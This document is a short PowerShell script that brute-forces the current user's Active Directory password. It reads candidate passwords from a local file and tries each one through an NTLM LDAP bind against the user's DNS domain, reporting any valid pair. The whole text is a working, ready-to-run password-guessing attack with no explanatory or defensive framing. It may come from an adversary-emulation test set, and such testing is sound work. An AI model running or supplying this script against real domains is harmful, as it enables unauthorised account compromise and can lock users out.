if ("NTLM".ToLower() -NotIn @("ntlm","kerberos")) {
  Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported"
  exit 1
}

[System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("$env:UserDnsDomain",389)

$passwordList = Get-Content -Path C:\temp\passwords.txt
foreach ($password in $passwordList){
  $credz = new-object System.Net.NetworkCredential("$ENV:USERNAME", $password, "$env:UserDnsDomain")
  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
  try {
    Write-Host " [-] Attempting ${password} on account $ENV:USERNAME."
    $conn.bind()
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host " [!] $ENV:USERNAME:${password} are valid credentials!"
  } catch {
    Write-Host $_.Exception.Message
  }
}
Write-Host "End of bruteforce"